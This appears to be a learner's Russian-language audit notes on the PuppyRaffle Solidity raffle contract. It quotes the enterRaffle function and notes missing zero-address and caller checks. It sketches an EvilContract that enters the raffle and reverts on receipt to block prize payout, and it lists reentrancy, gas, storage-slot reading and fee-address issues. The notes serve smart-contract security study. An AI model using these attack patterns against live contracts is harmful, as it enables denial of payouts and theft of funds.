пример эксплоита который я нашел 


function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
        }

        // Check for duplicates
        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
        emit RaffleEnter(newPlayers);
    }



тут отсутствует проверка на нулевой адресс и нету проверки что ток владелец может вызвать 


// Кто-то может зарегистрировать СВОЙ КОНТРАКТ как игрока
contract EvilContract {
    function attack() public {
        puppyRaffle.enterRaffle{value: 1 ether}([address(this)]);
        // Теперь контракт - участник лотереи!
    }
    
    // А когда придет время платить призовые...
    receive() external payable {
        // Можно делать всякие гадости
        revert();  // Просто заблокировать получение приза!
    }
}

// Злоумышленник вызывает:
enterRaffle([0x0000000000000000000000000000000000000000, 0x123...])

// Результат:
players = [0x123..., 0x0000...]  // В списке есть "мертвая душа"




само по себе там кучу багов уязвимостей к примеру reentrant
там большая часть ошибок сосредаточена на манипулации с газом и отсутствием проверок так же уж слишком много циклов за счет чего контракт дороже и функции туда же 
так же та же проблема что и в прошлый раз большая часть функции хоть и прайвот но ничего не мешает через деплой сделать и через ячейки узнать значение 

это я еще не говорю про feeaddress в DeployPuppyRaffle


